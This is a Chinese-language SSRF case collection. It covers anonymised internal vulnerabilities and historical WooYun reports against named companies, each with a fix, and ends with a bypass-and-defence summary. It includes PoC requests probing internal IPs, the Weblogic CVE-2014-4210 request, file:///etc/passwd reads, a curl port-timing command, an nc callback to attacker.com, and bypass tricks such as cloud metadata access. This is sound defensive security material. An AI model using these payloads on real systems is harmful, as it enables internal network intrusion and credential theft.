# SSRF 案例集

> 整合内部真实漏洞与业界经典案例，提供实战指导

## 一、内部真实案例

### 案例1：海外商店卖家中心 batchCreateCommodities 接口存在 SSRF 漏洞
**系统**: 某内部系统

**漏洞描述**:
`/rest/o/ecommerce/merchant/kwaiShop/batchCreateCommodities` 和 `/rest/o/ecommerce/merchant/thirdParty/batchCreateCommodities` 接口对参数中的 `cover` 参数发起访问，当恶意用户将 `cover` 参数设置为公司内网地址时，业务服务器会对内网机器发起访问，存在 SSRF 安全风险。接口存在签名校验，但签名算法是最简单的 MD5，且参与签名的参数都是公开的，攻击者在修改参数后可重新计算签名，导致可绕过签名校验。同时 `jumpUrl` 和 `affiliateLink` 链接参数可能被恶意用户改为钓鱼等恶意链接。

**技术细节**:
- `cover`、`jumpUrl`、`affiliateLink` 等链接参数均未做域名白名单校验
- 签名算法为 MD5，参与签名的参数均公开，签名可被重新计算绕过
- 服务端直接对用户传入的 URL 发起 HTTP 访问，无内网地址过滤

**修复方案**:
对需要访问的地址进行校验，禁止访问内网域名和 IP，可以添加白名单校验；对 `jumpUrl`、`affiliateLink` 校验是否在允许的域名白名单中。

**经验总结**:
服务端发起 HTTP 请求前需对目标 URL 进行严格校验，使用白名单限制允许访问的域名或 IP 段。

---

### 案例2：oversea-growth-social-media-uploader 存在 SSRF 绕过风险
**系统**: 某内部系统

**漏洞描述**:
后端服务会对用户传入的 `url` 参数发起访问，`url` 参数虽然添加了白名单校验，只允许 CDN 域名，但存在被绕过的风险。攻击者可通过构造特定格式的 URL 绕过域名白名单检测，从而访问内网地址。

**技术细节**:
- 白名单校验逻辑存在缺陷，可通过构造带有合法域名前缀的 URL 绕过
- 典型绕过方式：`https://cdn.example.com@192.168.1.1/` 或利用子域名混淆
- 未对 URL 的最终解析 IP 进行内网段校验

**修复方案**:
将白名单改为精确的域名列表，并在发起请求前解析 URL 的最终 IP 地址，校验是否属于内网段（`10.0.0.0/8`、`172.16.0.0/12`、`192.168.0.0/16`）。

**经验总结**:
需禁止访问内网 IP 段（`10.0.0.0/8`、`172.16.0.0/12`、`192.168.0.0/16`）和回环地址，白名单域名校验应解析为最终 IP 后再判断。

---

### 案例3：某内部系统仓库存在 SSRF 安全风险
**系统**: 某内部系统

**漏洞描述**:
以下两个接口会从参数中获取 `inKindPrize.imageUrl` 参数，并通过 `Resources.asByteSource` 方法对该 URL 发起访问，恶意用户可以将 `inKindPrize.imageUrl` 参数设置为公司内网域名，后端服务器会对公司内部的域名发起访问，从而进行内网攻击，存在 SSRF 安全风险。
- `/rest/o/ecommerce/merchant/campaign/lottery/create`
- `/rest/o/ecommerce/merchant/campaign/lottery/update`

**技术细节**:
- 活动图片 URL 参数 `imageUrl` 未限制目标域名
- 使用 `Resources.asByteSource` 直接读取远程 URL 内容，未做任何校验
- 可访问内网任意 HTTP 服务，获取内网响应内容

**修复方案**:
需要对该类链接参数进行白名单校验，限制可以访问的域名地址，禁止访问内网域名。

**经验总结**:
DNS 重绑定攻击可绕过 IP 校验，需在建立 TCP 连接后再次校验 IP 而非仅在解析时校验。

---

### 案例4：某内部系统面试平台接口存在 SSRF
**系统**: 某内部系统

**漏洞描述**:
接口接收 `url` 参数，存在无回显 SSRF 问题。`/api/interview/tenant-web/tenant/notification-callback` 接口存在类似问题。下游漏洞触发点有两处：某内部类中的 `scheduleNotification()` 和 `sendNotification()` 方法。

**技术细节**:
- 无回显 SSRF，无法直接获取内网响应内容，但可通过时间差或 DNS 外带进行探测
- 回调通知功能的 URL 参数未做域名限制
- 同一 Controller 下多个通知接口均存在相同问题

**修复方案**:
建议使用隔离代理，所有对外 HTTP 请求统一通过安全代理转发，代理层面做内网访问拦截。

**经验总结**:
URL 重定向可以绕过域名白名单，需关闭 HTTP 重定向跟随，或对重定向目标同样进行校验。

---

### 案例5：海外某电商系统 updateExistCommodity 接口存在 SSRF
**系统**: 某内部系统

**漏洞描述**:
`/rest/o/ecommerce/merchant/thirdParty/updateExistCommodity` 接口会通过参数传入 `jumpUrl`、`affiliateLink`、`cover` 等链接参数，该类链接参数在代码中会发起 HTTP 访问，存在 SSRF 安全风险，需要对该类链接参数进行白名单校验，限制可以访问的域名地址。

**技术细节**:
- `jumpUrl`、`affiliateLink`、`cover` 三类 URL 参数均未做域名白名单
- 服务端直接对参数 URL 发起 HTTP 请求
- `file://`、`gopher://`、`dict://` 等协议同样可能被利用

**修复方案**:
需要对该类链接参数进行白名单校验，限制可以访问的域名地址，可参考内部安全规范统一接入。

**经验总结**:
`file://`、`gopher://`、`dict://` 等非 HTTP 协议需在 URL 解析阶段直接拒绝。

---

### 案例6：拉流地址设置处存在无回显 SSRF
**系统**: 某内部系统

**漏洞描述**:
某云直播平台，拉流信息的拉流地址设置处存在无回显 SSRF。应用程序接受用户可控的拉流地址参数且没有对该参数进行安全校验，就向该参数指定的 URI 处发起请求，造成 SSRF 安全漏洞。

**技术细节**:
- 直播拉流地址允许用户任意填写，服务端会对该地址发起访问验证
- 无回显，但可通过 DNS 查询记录或时间差判断是否访问成功
- 服务端未限制 HTTP 30x 跳转，可通过重定向绕过部分过滤

**修复方案**:
禁止 30x 跳转；对拉流地址进行域名白名单校验，禁止填写内网地址。

**经验总结**:
Webhook 类功能需校验用户提供的回调地址不指向内网，并限制请求超时时间。

---

### 案例7：商家中心 AI 加卖点功能接口存在无回显 SSRF
**系统**: 某内部系统

**漏洞描述**:
商家中心商品图片智能编辑 AI 加卖点功能（`"genAction":"gen_by_template"`）接口存在无回显 SSRF。`"itemValue"` 传入内网地址，发现可访问到公司内网。

**技术细节**:
- AI 功能接口的图片 URL 参数 `itemValue` 直接被服务端请求
- 无回显 SSRF，通过 DNS 外带或时间差探测内网
- 可访问云环境元数据服务（`169.254.169.254`）

**修复方案**:
白名单域名校验 + 接入隔离代理。

**经验总结**:
云环境的元数据服务（`169.254.169.254`）需明确加入 SSRF 黑名单。

---

### 案例8：snackvideo studio 系统存在 SSRF 漏洞
**系统**: 某内部系统

**漏洞描述**:
在通过 pull-stream 方式创建直播时，需要填写 pull-stream URL，后端会访问该 URL，该地址可以填写公司内网地址，后端服务器会对内部地址发起访问，存在 SSRF 漏洞。

**技术细节**:
- 直播创建接口的拉流 URL 参数直接被服务端访问，无限制
- 可填写内网域名或 IP，服务端会建立连接并发起请求
- 即使无完整回显，也可通过响应时间判断端口开放情况

**修复方案**:
对 URL 进行限制，不允许 URL 为内网域名和内网 IP，或者直接限制只能是固定域名列表中的域名。

**经验总结**:
SSRF 可用于探测内网服务，即使不能获取完整响应，也可通过响应时间判断端口开放。

---

### 案例9：海外 DSP 系统存在 SSRF 漏洞
**系统**: 某内部系统

**漏洞描述**:
以下两个接口会对请求参数中的 `marketLink` 参数发起访问，当恶意用户将 `marketLink` 参数设置为公司内网地址时，业务服务器会对内网发起访问，恶意攻击者利用该漏洞可以发起对内网的访问探测，存在 SSRF 漏洞：
- `/rest/i18n/adDsp/app/market/check`
- `/rest/i18n/adDsp/app/save`

**技术细节**:
- 应用市场链接参数 `marketLink` 被服务端直接请求，未做域名限制
- 两个接口均存在相同问题，属于同类漏洞批量问题
- 可用于探测内网 HTTP/HTTPS 服务

**修复方案**:
接入 HTTP 代理，所有对外 HTTP 请求通过安全代理转发，代理层面做内网访问拦截。

**经验总结**:
图片/文件加载类接口允许传入 URL 时，需在服务端做 SSRF 防护，而不依赖前端校验。

---

### 案例10：AI 预审接口存在无回显 SSRF
**系统**: 某内部系统

**漏洞描述**:
某内部系统 AI 预审功能接口 `/stream/pre-check/start` 的 `"accountBasic"-"webSite"` 参数存在 SSRF 漏洞（无回显）。

**技术细节**:
- AI 预审功能的账号基础信息中的 `webSite` 字段被服务端直接发起 HTTP 请求
- 无回显，但通过 DNS 外带可确认漏洞存在
- 代理转发功能未限制转发目标范围

**修复方案**:
接入 SSRF 隔离代理，所有外部 HTTP 请求统一通过安全代理转发。

**经验总结**:
代理转发功能如果暴露给用户配置，需严格限制转发目标的范围。

---

## 二、业界经典案例（乌云）

### 案例1：17173 一处可探内网 SSRF（可获取内网系统页面内容）
**厂商**: 17173游戏 | **类型**: SSRF（内网探测）

**洞察**: 游戏网站的外部 URL 请求功能未限制内网地址，可通过 SSRF 探测内网 Web 服务并获取响应内容。

**测试流程**:
1. 发现可请求外部 URL 的功能点
2. 将 URL 参数替换为内网地址（`192.168.x.x`）
3. 观察响应中是否包含内网内容
4. 遍历内网 C 段，发现存活主机和服务

**技术细节**:
17173 某功能未做域名限制，目标域未做限制，可探测内网 `192.168.1.x` 和 `10.18.10.x` 等多个内网段，发现有 Web 环境的 IP。

**POC 示例**:
```
GET /proxy?url=http://192.168.1.27/ HTTP/1.1
GET /proxy?url=http://10.18.10.91:8080/ HTTP/1.1
```

**绕过技巧**: 无特殊绕过，直接替换 URL 参数即可。

**修复建议**: 建立内网 IP 黑名单（`0.0.0.0/8`、`10.0.0.0/8`、`172.16.0.0/12`、`192.168.0.0/16`、`127.0.0.1`），限制 domain 只允许公网 IP。

---

### 案例2：友盟主站 SSRF 可探测内网（编码绕过）
**厂商**: 友盟 | **类型**: SSRF（Unicode 编码绕过）

**洞察**: 友盟的 `feedback_request_proxy` 接口对 `path` 参数进行 Unicode 编码后转发，可利用此机制探测内网所有 Web 服务。

**测试流程**:
1. 发现 `/api/feedback_request_proxy/` 接口
2. 构造内网 IP 作为 `path` 参数
3. 服务端对 path 进行 Unicode 编码后请求
4. 从响应中获取内网页面内容

**技术细节**:
`www.umeng.com/api/feedback_request_proxy/?appkey=4fe11bd85270156dd8000014&path=[内网IP]`，服务器获取 path 的 URL，进行 Unicode 编码后传递给客户端，可访问所有内网 IP。

**POC 示例**:
```
GET /api/feedback_request_proxy/?appkey=4fe11bd85270156dd8000014&path=192.168.1.27 HTTP/1.1
```

**绕过技巧**: 服务端主动对参数进行 Unicode 编码后请求，客户端无需额外绕过。

**修复建议**: 对 `path` 参数验证目标地址是否为公网 IP，拒绝内网 IP 请求。

---

### 案例3：央视网 SSRF 可窥探内网（Weblogic SSRF 案例）
**厂商**: 中国网络电视台 | **类型**: SSRF（Weblogic UDDI Explorer）

**洞察**: Weblogic 10.0.2-10.3.6 版本的 `SearchPublicRegistries.jsp` 存在 SSRF，可用于探测任意内网主机的任意端口。

**测试流程**:
1. 发现目标运行 Weblogic（CVE-2014-4210）
2. 访问 `/uddiexplorer/SearchPublicRegistries.jsp`
3. 修改 URL 参数为内网地址
4. 根据响应差异判断端口开放情况

**技术细节**:
Weblogic CVE-2014-4210，`SearchPublicRegistries.jsp` 的 `operatorURL` 参数存在 SSRF，可探测内网任意主机端口。

**POC 示例**:
```
GET /uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://192.168.165.143:80 HTTP/1.1
```

**绕过技巧**: 直接使用，Weblogic 内置的 HTTP 客户端无过滤。

**修复建议**: 升级 Weblogic 补丁，禁用 UDDI Explorer 组件，网络层隔离 Weblogic 服务器的出站请求。

---

### 案例4：平安银行主站 SSRF 漏洞（可扫描整个内网）
**厂商**: 平安银行 | **类型**: SSRF（Weblogic UDDI Explorer，金融机构）

**洞察**: 银行系统对外暴露 Weblogic UDDI Explorer 接口，通过 SSRF 可扫描整个银行内网，定位内部服务。

**测试流程**:
1. 发现平安银行 Weblogic 服务
2. 访问 UDDI Explorer 确认 SSRF
3. 编写自动化脚本扫描内网 C 段
4. 发现内网敏感系统

**技术细节**:
UDDI Explorer 对外开放，Weblogic Server 内网地址可通过 SSRF 探测；通过 nc 监听可接收内网服务器的 HTTP 请求。

**POC 示例**:
```
nc -l 80
# 访问 /uddiexplorer/SearchPublicRegistries.jsp?operator=http://attacker.com:80
# 收到: POST / HTTP/1.0 Content-Type: text/xml; charset=UTF-8
```

**绕过技巧**: 可将 `attacker.com` 替换为任意内网 IP 进行探测。

**修复建议**: 禁用 UDDI Explorer，Weblogic 部署在 DMZ 区域，限制对内网的出站连接。

---

### 案例5：人人网 SSRF 之绕过（短地址绕过 IP 过滤）
**厂商**: 人人网 | **类型**: SSRF（短地址绕过 IP 黑名单）

**洞察**: 目标对 SSRF 的防护使用 IP 黑名单，可通过短地址服务（如 t.cn）将内网 IP 包装为短链接绕过黑名单检测。

**测试流程**:
1. 发现目标 SSRF 接口但有 IP 过滤
2. 将内网 IP 注册为短地址
3. 使用短地址绕过 IP 黑名单
4. 服务端跟随重定向访问内网地址

**技术细节**:
使用短地址绕过 IP 过滤：内网 IP → 短地址 → 服务端跟随重定向 → 访问内网。

**POC 示例**:
```
1. 创建短地址: http://t.cn/xxx -> http://192.168.1.1
2. 使用: GET /ssrf?url=http://t.cn/xxx HTTP/1.1
3. 服务端跟随302重定向到内网
```

**绕过技巧**: 短地址服务绕过基于域名/IP 的黑名单过滤。

**修复建议**: 在 HTTP 重定向的每一跳都检查目标 IP，使用 DNS 解析后的最终 IP 进行验证。

---

### 案例6：某搜索引擎某处 SSRF 可探测内网服务器与端口
**厂商**: 某搜索引擎 | **类型**: SSRF（站长平台网站验证）

**洞察**: 搜索引擎站长平台的网站验证功能会主动访问提交的 URL，可将 URL 替换为内网地址实现 SSRF。

**测试流程**:
1. 注册搜索引擎站长平台账号
2. 添加网站验证时提交内网 IP
3. 根据错误信息差异判断端口状态
4. 遍历内网 IP 和端口

**技术细节**:
站长平台验证网站 URL 时会主动请求，通过响应差异探测内网：找不到文件 → 已访问；无法连接 → IP 不存在；检查结果为空 → 端口开放。

**POC 示例**:
```
提交网站URL: http://10.50.33.43:22
响应: 服务器检查结果为空 → 端口开放
响应: 无法连接到服务器 → 端口关闭
```

**绕过技巧**: 利用站长平台的主动访问机制，不需要特殊绕过。

**修复建议**: 限制站长平台验证器只访问公网 IP，记录并告警内网 IP 访问请求。

---

### 案例7：深圳证券交易所主站 SSRF
**厂商**: 深圳证券交易所 | **类型**: SSRF（金融机构主站）

**洞察**: 证券交易所主站存在 SSRF，可通过 SSRF 扫描证券交易所内网基础设施，金融机构内网安全风险极高。

**测试流程**:
1. 发现主站存在外部 URL 请求功能
2. 替换为内网地址测试
3. 根据响应差异确认 SSRF
4. 枚举证券所内网服务

**技术细节**:
深圳证券交易所主站 SSRF 漏洞，可探测内网存活主机和服务，金融机构内网包含核心交易系统，危害极高。

**POC 示例**:
```
GET /service/fetch?url=http://10.0.0.1/ HTTP/1.1
```

**绕过技巧**: 无特殊绕过。

**修复建议**: 严格验证请求目标 IP，证券所需额外合规检查，禁止内部系统的出站 HTTP 请求。

---

### 案例8：湖北移动某系统 SSRF 可导致内网探测
**厂商**: 湖北移动 | **类型**: SSRF（运营商内网探测）

**洞察**: 运营商内网包含大量核心基础设施，SSRF 可用于发现和攻击这些敏感系统。

**测试流程**:
1. 发现运营商系统的外部请求功能
2. 构造内网地址的 SSRF payload
3. 根据响应时间或内容判断内网服务
4. 发现运营商内部计费、基站管理等系统

**技术细节**:
湖北移动某系统存在 SSRF 可探测内网，运营商内网包含大量敏感系统，通过时间差可区分端口开放和关闭。

**POC 示例**:
```
GET /proxy?url=http://10.16.0.1/ HTTP/1.1

使用时间差探测端口：
curl -o /dev/null -w '%{time_total}' 'http://target/ssrf?url=http://192.168.1.1:22'
```

**绕过技巧**: 利用时间差区分端口开放和关闭。

**修复建议**: 限制 SSRF 功能的访问范围，运营商系统应与公网完全隔离。

---

### 案例9：某运营商南广西分公司存在 SSRF 漏洞（Weblogic CVE-2014-4210）
**厂商**: 某运营商南广西分公司 | **类型**: SSRF（Weblogic CVE-2014-4210）

**洞察**: Weblogic UDDI Explorer 的 SSRF 漏洞在运营商行业普遍存在，可通过该漏洞扫描运营商整个内网。

**测试流程**:
1. 扫描发现目标运行 Weblogic
2. 访问 `/uddiexplorer/SetupUDDIExplorer.jsp`
3. 构造 SSRF 探测内网
4. 根据响应时间差异判断端口开放

**技术细节**:
CVE-2014-4210，Weblogic `SearchPublicRegistries.jsp` SSRF，通过探测端口开放情况扫描内网。

**POC 示例**:
```
GET /uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&selfor=Business+location&btnSubmit=Search&operator=http://10.0.0.1:8080/ HTTP/1.1
```

**绕过技巧**: 直接利用 CVE-2014-4210，无需绕过。

**修复建议**: 删除 `uddiexplorer` 目录或升级 Weblogic 补丁。

---

### 案例10：盛大某站存在 SSRF 可读取本地文件及探测内网
**厂商**: 盛大游戏 | **类型**: SSRF（file:// 协议读取本地文件）

**洞察**: SSRF 不仅可以探测内网，还可以通过 `file://` 协议读取服务器本地文件（如 `/etc/passwd`、配置文件等）。

**测试流程**:
1. 发现 SSRF 漏洞点
2. 测试 `file://` 协议访问本地文件
3. 读取 `/etc/passwd` 确认漏洞
4. 读取应用配置文件获取数据库密码

**技术细节**:
盛大某站 SSRF 可通过 `file://` 协议读取本地文件，也可探测内网，`file://` 协议可绕过仅针对 HTTP 的 SSRF 过滤。

**POC 示例**:
```
# 读取本地文件
GET /fetch?url=file:///etc/passwd HTTP/1.1

# 读取配置文件
GET /fetch?url=file:///var/www/html/config.php HTTP/1.1
```

**绕过技巧**: `file://` 协议绕过只针对 HTTP 的 SSRF 过滤。

**修复建议**: 禁止 `file://`、`gopher://` 等非 HTTP 协议，只允许 `https://` 协议。

---

## 三、方法论总结

### 3.1 高频参数统计

| 参数名 | 出现次数 | 漏洞场景 |
|--------|----------|----------|
| `url` / `URL` | 5 | 代理转发、直播拉流、通知回调 |
| `cover` | 2 | 商品图片链接 |
| `imageUrl` / `itemValue` | 2 | 图片/AI功能链接参数 |
| `marketLink` | 1 | 应用市场链接 |
| `webSite` | 1 | 账号基础信息 |
| `jumpUrl` / `affiliateLink` | 1 | 跳转链接/联盟链接 |
| `path` | 1 | 代理转发路径 |
| `operatorURL` | 1 | Weblogic UDDI |
| `pullStreamUrl` | 1 | 直播拉流地址 |

**高危参数命名规律**: 含 `url`、`link`、`image`、`src`、`host`、`path`、`callback`、`redirect`、`fetch`、`proxy` 关键词的参数均需重点关注。

### 3.2 攻击模式分布

| 攻击模式 | 数量 | 占比 | 典型场景 |
|----------|------|------|----------|
| 直接内网访问（无回显） | 6 | 30% | 拉流地址、AI功能、回调通知 |
| 白名单绕过 | 3 | 15% | CDN域名前缀混淆、短地址、重定向 |
| Weblogic CVE-2014-4210 | 3 | 15% | 运营商、金融机构Weblogic |
| 内网端口探测 | 4 | 20% | 搜索引擎站长平台、运营商系统 |
| file:// 协议读取本地文件 | 1 | 5% | 盛大游戏 |
| 云元数据访问 | 1 | 5% | AI 功能接口 |
| 签名绕过结合 SSRF | 1 | 5% | 海外商店卖家中心 |
| DNS 重绑定 | 1 | 5% | 通用绕过场景 |

### 3.3 关键检测信号

**代码层检测**:
- 搜索 `HttpClient`、`RestTemplate`、`OkHttp`、`URL.openConnection()`、`Resources.asByteSource()` 等 HTTP 客户端调用
- 搜索接收 URL 类参数的接口：参数名含 `url`、`link`、`src`、`path`、`host`、`address`、`target`、`callback`
- 搜索 `302`、`redirect`、`follow` 相关的 HTTP 重定向跟随配置
- 关注 Webhook 注册、图片/文件 URL 处理、网站验证类功能

**运行时检测**:
- 访问内网地址（`10.x.x.x`、`172.16-31.x.x`、`192.168.x.x`、`127.0.0.1`）返回 200 或有内容
- 访问元数据地址 `169.254.169.254` 有响应
- DNS 查询记录出现内网域名
- 响应时间异常差异（端口探测特征）

### 3.4 常见绕过技巧

| 绕过方式 | 原理 | 防御方法 |
|----------|------|----------|
| 短地址/URL 跳转 | 解析时为公网，跟随跳转后为内网 | 禁用重定向跟随，或每跳都校验目标 IP |
| IP 进制转换 | `2130706433` = `127.0.0.1`，`0x7f000001` = `127.0.0.1` | 统一解析为标准 IP 后校验 |
| IPv6 格式 | `::1` = `127.0.0.1`，`[::ffff:10.0.0.1]` | 同时过滤 IPv4 和 IPv6 |
| DNS 重绑定 | 先返回公网 IP 通过校验，再返回内网 IP | 连接建立后再次校验真实 IP |
| 域名前缀混淆 | `https://内网IP.attacker.com/` 匹配白名单前缀 | 精确域名校验而非前缀匹配 |
| `file://` 协议 | 绕过仅限制 HTTP 协议的过滤 | URL 解析后拒绝非 HTTP/HTTPS 协议 |
| `gopher://`/`dict://` | 发起 TCP raw 请求攻击 Redis、Memcache | 同上，协议白名单 |
| Unicode/编码绕过 | URL 编码、Unicode 规范化后指向内网 | 解码后再校验 |
| 云元数据地址 | `169.254.169.254` 访问 IAM Token | 明确加入黑名单 |
